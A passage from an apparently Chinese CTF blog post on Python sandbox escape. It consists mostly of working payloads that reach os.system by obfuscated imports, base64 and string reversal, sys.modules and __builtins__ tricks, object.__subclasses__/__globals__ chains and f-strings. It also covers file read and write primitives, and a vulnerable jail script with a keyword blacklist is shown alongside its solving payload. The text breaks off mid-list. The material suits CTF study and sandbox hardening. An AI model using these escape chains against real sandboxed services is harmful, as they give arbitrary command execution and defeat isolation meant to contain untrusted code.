class="line">print(__import__(&#x27;so&#x27;[::-1]).system(&#x27;whoami&#x27;))#逆序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a,b=&#x27;o&#x27;,&#x27;s&#x27;</span><br><span class="line">print(__import__(a+b).system(&#x27;whoami&#x27;))#变量拼接</span><br></pre></td></tr></table></figure><p>也可以使用eval、exec 都是相当危险的函数，exec 比 eval 还要危险</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1]))#eval绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1]))#exec绕过</span><br></pre></td></tr></table></figure><p>上面提到了逆序、变量拼接，同样也可以使用base64、hex、rot13等其他方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(__import__(&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;whoami&#x27;))#base64绕过，python2</span><br></pre></td></tr></table></figure><h4 id="绕过sys-modules"><a href="#绕过sys-modules" class="headerlink" title="绕过sys.modules"></a>绕过sys.modules</h4><p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。</p><p>当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。字典sys.modules具有字典所拥有的一切方法，可以通过这些方法了解当前的环境加载了哪些模块</p><p>有些库例如 os是默认被加载进来的，但是不能直接使用，原因在于sys.modules中未经import加载的模块对当前空间是不可见的。</p><p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;whoami&#x27;)#报错AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;</span><br></pre></td></tr></table></figure><p>此处这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为当import一个模块时：import A，检查 sys.modules 中是否已经有A，如果有则不加载，如果没有则为A创建 module 对象，并加载 A。所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。<br>然后针对上面的方法的绕过方式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">del sys.modules[&#x27;os&#x27;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;whoami&#x27;)#绕过成功</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同时也可以使用__builtins__绕过：</span><br><span class="line">print(__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;))</span><br><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><h4 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h4><p>通过上面内容我们很容易发现，引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过os.system执行系统命令，并且这里的system也不是字符串，也没法直接做编码等等操作。比如直接去os.py直接把system函数删掉或者直接过滤system函数</p><p>通过上面命令执行的函数列表可以知道可以通过，下面等多种方式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&#x27;whoami&#x27;).read())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1))</span><br></pre></td></tr></table></figure><p>或者可以使用getattr 拿到对象的方法、属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p>不用import的绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与 getattr 相似的还有 __getattr__、__getattribute__，它们自己的区别就是getattr相当于class.attr，都是获取类属性/方法的一种方式，在获取的时候会触发__getattribute__，如果__getattribute__找不到，则触发__getattr__，找不到则报错。</span><br></pre></td></tr></table></figure><h4 id="继承关系逃逸"><a href="#继承关系逃逸" class="headerlink" title="继承关系逃逸"></a>继承关系逃逸</h4><p>Python类是支持（多）继承的，一个类的方法和属性可能定义在当前类，也可能定义在基类。针对这种情况，当调用类方法或类属性时，就需要对当前类以及它的基类进行搜索，以确定方法或属性的位置，而搜索的顺序就称为方法解析顺序。</p><p>方法解析顺序（Method Resolution Order），简称 MRO。对于只支持单继承的编程语言来说，MRO 很简单，就是从当前类开始，逐个搜索它的父类；而对于 Python，它支持多继承，MRO 相对会复杂一些。</p><p>实际上，Python 发展至今，经历了以下 3 种 MRO 算法，分别是：</p><ul><li><p>自左向右的深度优先搜索算法</p></li><li><p>自左向右的广度优先搜索算法</p></li><li><p>自 Python 2.3 版本，对新式类采用了 C3 算法。由于 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法。</p></li></ul><p>2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 Python 3.x 仅支持新式类，所以该版本只使用 C3 算法。</p><p>MRO就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。虽然判断继承方式不太合理，但是python的新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python支持多重继承，在解析父类的__init__时，定义解析顺序的是子类的__mro__属性，内容为一个存储要解析类顺序的元组。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#__class__功能和type()函数一样，都是查看对象所在的类。并且__class__可以套用</span><br><span class="line">print(&#x27;&#x27;.__class__.__mro__)#(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)#&#x27;&#x27;属于str类，它继承了object类</span><br><span class="line">print(().__class__.__mro__)#(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)#()属于tuple类，它继承了object类</span><br></pre></td></tr></table></figure><p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#__bases__和__bases__都是内置函数， 用来查看类的继承关系</span><br><span class="line">class test:</span><br><span class="line">    pass</span><br><span class="line">print(test.__base__,&#x27;\t&#x27;,test.__bases__)#&lt;class &#x27;object&#x27;&gt;  (&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure><p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import site</span><br><span class="line">print(site.os)#&lt;module &#x27;os&#x27; from &#x27;C:\\Users\\30261\\new\\python\\python3.9\\lib\\os.py&#x27;&gt;</span><br></pre></td></tr></table></figure><p>可以在site中看到import os字样，也就是说，能引入site的话，就相当于有 os。</p><p>那如果site也被禁用了呢？可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import site</span><br><span class="line"></span><br><span class="line"># print(os)#报错</span><br><span class="line">os=reload(site.os)</span><br><span class="line">print(os.system(&quot;whoami&quot;))</span><br></pre></td></tr></table></figure><p>同时可以看到所有的类都继承了<code>object</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br><span class="line">从代码上我们比较好理解，就是从()找到它的父类也就是__bases__[0]，而这个父类就是Python中的根类&lt;type &#x27;object&#x27;&gt;，它里面有很多的子类，包括file等，这些子类中就有跟os、system等相关的方法，所以，我们可以从这些子类中找到自己需要的方法。</span><br></pre></td></tr></table></figure><p>那么我们先用<code>__subclasses__</code>看看<code>object</code>的子类，以 2.x 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"></span><br><span class="line">for i in enumerate(().__class__.__mro__[-1].__subclasses__()):print(i)</span><br><span class="line">#(136, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;)(137, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;)#python3结果</span><br><span class="line">#(72, &lt;class &#x27;site._Printer&#x27;&gt;)(73, &lt;class &#x27;site._Helper&#x27;&gt;)#python2结果</span><br><span class="line">#enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，</span><br></pre></td></tr></table></figure><p>可以看到，site 就在里面，以 python2.7 的<code>site._Printer</code>为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__globals__[&#x27;os&#x27;])</span><br><span class="line">#&lt;module &#x27;os&#x27; from &#x27;C:\Users\30261\new\python\python2.7\lib\os.pyc&#x27;&gt;#python2结果</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dir(().__class__.__mro__[-1].__subclasses__()[72]))</span><br><span class="line">#可以看到_Printer__setup属性</span><br></pre></td></tr></table></figure><p>可以看到同样也能得到os.pyc。同时在 site 中还有 <code>__builtins__</code></p><p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import warnings</span><br><span class="line">#print(warnings.os)#报错</span><br><span class="line">print(warnings.linecache)#&lt;module &#x27;linecache&#x27; from &#x27;\python2.7\lib\linecache.pyc&#x27;&gt;</span><br><span class="line">print(warnings.linecache.os)#&lt;module &#x27;os&#x27; from &#x27;C:\Users\30261\new\python\python2.7\lib\os.pyc&#x27;&gt;</span><br></pre></td></tr></table></figure><p>然后化简一下继承链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[59]))</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;])</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;])</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;))</span><br></pre></td></tr></table></figure><p>同时在<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性</p><p><img src="/image/media/2022/python/1.png"></p><p>所以通过<code>_module</code>也可以构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__mro__[-1].__subclasses__()[60]()._module.linecache.os.system(&#x27;whoami&#x27;))</span><br></pre></td></tr></table></figure><p>或者也可以利用循环来自动寻找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">[x for x in ().__class__.__mro__[-1].__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><p>同样，py3.x 中有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，利用方式可以为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134])</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__))</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;])</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;](&quot;whoami&quot;))</span><br></pre></td></tr></table></figure><p>可以看到前面几个利用方式前面的部分片段都是一样的，都是用<code>().__class__.__mro__[-1]</code>去定位&lt;class ‘object’&gt;，所以可以简化为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(object.__subclasses__()[60]()._module.linecache.os.system(&#x27;whoami&#x27;))#python2</span><br><span class="line"></span><br><span class="line">print(object.__subclasses__()[134].__init__.__globals__[&#x27;system&#x27;](&quot;whoami&quot;))#python3</span><br></pre></td></tr></table></figure><p>还有一种就是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in enumerate(().__class__.__mro__[-1].__subclasses__()):print(i)</span><br><span class="line">#(37, &lt;class &#x27;builtin_function_or_method&#x27;&gt;)</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__())</span><br><span class="line"># print(().__class__.__mro__[-1].__subclasses__()[37])</span><br><span class="line"># print(dir(().__class__.__mro__[-1].__subclasses__()[37].__call__))</span><br><span class="line">print(().__class__.__mro__[-1].__subclasses__()[37].__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br></pre></td></tr></table></figure><p>同样可以化简为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(object.__subclasses__()[37].__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line"></span><br><span class="line">print([].__getattribute__(&#x27;append&#x27;).__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br></pre></td></tr></table></figure><p>还有就是利用定义类调用super</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class test(dict):</span><br><span class="line">    def __init__(self):</span><br><span class="line">    #python2</span><br><span class="line">        print(super(test, self).keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">        #如果是 3.x 的话可以简写为：</span><br><span class="line">        print(super().keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">        # super().keys.__class__.__call__(eval, &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;))</span><br><span class="line">test()</span><br></pre></td></tr></table></figure><p>还有一些比较奇特的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27; ))#python2</span><br><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;popen&#x27;](&#x27;who&#x27;+&#x27;ami&#x27;).read())#变体</span><br></pre></td></tr></table></figure><ul><li>总结</li></ul><p>首先就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，</p><p>再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，</p><p>或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>读文件常用用到的方法有open、read、readline、readlines、write、file（python2）</p><p>还有一些不太常用<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)</p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>危害不大，主要就是可以用来读flag之类的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(file(&quot;filename&quot;).read())</span><br><span class="line">或者</span><br><span class="line">import types</span><br><span class="line">print(types.FileType(&quot;filename&quot;).read())</span><br><span class="line">或者</span><br><span class="line">with open(&quot;C:\Windows\win.ini&quot;) as f :print(f.readlines())</span><br><span class="line">或者</span><br><span class="line">print(().__class__.__bases__[0].__subclasses__()[40](&#x27;filename&#x27;).read())#python2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读文件暂时没什么发现特别的地方。</p><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>危害比较大因为如果可以写进入，然后就能被调用或者输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file(&#x27;filename&#x27;, &#x27;w&#x27;).write(&#x27;写入的内容&#x27;)</span><br><span class="line">或者</span><br><span class="line">test.py:</span><br><span class="line">import os</span><br><span class="line">print(os.system(&#x27;whoami&#x27;))</span><br><span class="line">然后在另一个文件中执行import test就能执行命令了</span><br><span class="line">或者</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;filename&#x27;, &#x27;w&#x27;).write(&#x27;写入的内容&#x27;)#python2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。</p><p>之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><p>由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import test</span><br><span class="line">print(__builtins__.open(test).read())</span><br><span class="line">或者</span><br><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;key&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul><li>过滤<code>[</code>和<code>]</code></li></ul><p>应对的方式就是将<code>[</code>和<code>]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read())#python2</span><br></pre></td></tr></table></figure><ul><li>利用新特性</li></ul><p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串文字或f -string是前缀为&#x27;f&#x27;or的字符串文字&#x27;F&#x27;。这些字符串可能包含替换字段，它们是由花括号分隔的表达式&#123;&#125;。虽然其他字符串文字总是有一个常量值，但格式化字符串实际上是在运行时评估的表达式。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print( f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#x27;)</span><br></pre></td></tr></table></figure><ul><li>序列化</li></ul><p>等更新吧</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>比赛的时候，遇到一个题目python2写的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">from __future__ import print_function</span><br><span class="line">print(&quot;=========================&quot;)</span><br><span class="line">print(&quot;  WELCOME TO FOOBAR JAIL &quot;)</span><br><span class="line">print(&quot;=========================&quot;)</span><br><span class="line">blacklist = [</span><br><span class="line">    &quot;import&quot;,</span><br><span class="line">    &quot;exec&quot;,</span><br><span class="line">    &quot;eval&quot;,</span><br><span class="line">    &quot;os&quot;,</span><br><span class="line">    &quot;pickle&quot;,</span><br><span class="line">    &quot;subprocess&quot;,</span><br><span class="line">    &quot;input&quot;,</span><br><span class="line">    &quot;blacklist&quot;,</span><br><span class="line">    &quot;sys&quot;,</span><br><span class="line">    &quot;ls&quot;,</span><br><span class="line">    &quot;cat&quot;,</span><br><span class="line">    &quot;echo&quot;,</span><br><span class="line">    &quot;la&quot;,</span><br><span class="line">    &quot;flag&quot;,</span><br><span class="line">    &quot;tac&quot;,</span><br><span class="line">    &quot;grep&quot;,</span><br><span class="line">    &quot;find&quot;]</span><br><span class="line">builtin = __builtins__.__dict__.keys()</span><br><span class="line">builtin.remove(&#x27;raw_input&#x27;)</span><br><span class="line">builtin.remove(&#x27;print&#x27;)</span><br><span class="line">for modules in builtin:</span><br><span class="line">    del __builtins__.__dict__[modules]</span><br><span class="line">while 1 == 1:</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;&gt;&gt;&gt;&quot;, end=&#x27; &#x27;)</span><br><span class="line">        val = raw_input()</span><br><span class="line">        for word in blacklist:</span><br><span class="line">            if word.lower() in val.lower():</span><br><span class="line">                print(&quot;Sorry!! You cannot use that here.&quot;)</span><br><span class="line">                break</span><br><span class="line">            else: </span><br><span class="line">                print(&quot;4566.&quot;)</span><br><span class="line">                exec val   </span><br><span class="line">    except:</span><br><span class="line">        print (&quot;What are you doing ? :(&quot;)</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;who&#x27;+&#x27;ami&#x27;))</span><br></pre></td></tr></table></figure><h2 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h2><p>1、注意题目为python2还是python3的环境，其对应的库会有很大的差距，但总体来说，python27有的，python3都有，但需要改变相应下标</p><p>2、曲径通幽，最终获得你想要的模块，认真找慢慢翻，比如从<code>().__class__.__bases__[0].__subclasses__()</code> 出发，查看可用的类</p><ul><li>若类中有file，考虑读写操作</li><li>若类中有&lt;class ‘warnings.WarningMessage’&gt;，考虑从<code>.__init__.func_globals.values()[13]</code>获取eval，map等等；又或者从<code>.__init__.func_globals[linecache]</code> 得到os</li><li>若类中有&lt;type ‘file’&gt;，&lt;class ‘ctypes.CDLL’&gt;，&lt;class ‘ctypes.LibraryLoader’&gt;，考虑构造so文件<br>其他的相关关键字可以搜索魔法函数，会对魔法函数有更多的理解</li></ul><p>3、分析ban函数的时候考虑使用字符串拼接结合<code>__getattribute__</code>绕过；当然也可以考虑加解密或者字符拼接来进行绕过</p><p>4、执行任意命令不仅仅只有os.system还有前面提到的多种方法</p><p>5、注意一种简单题型，出题者只做了如下一些处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;__import__&#x27;] # __import__ is the function called by the import statement</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;eval&#x27;] # evaluating code could be dangerous</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;execfile&#x27;] # likewise for executing the contents of a file</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&#x27;input&#x27;] # Getting user input and evaluating it might be 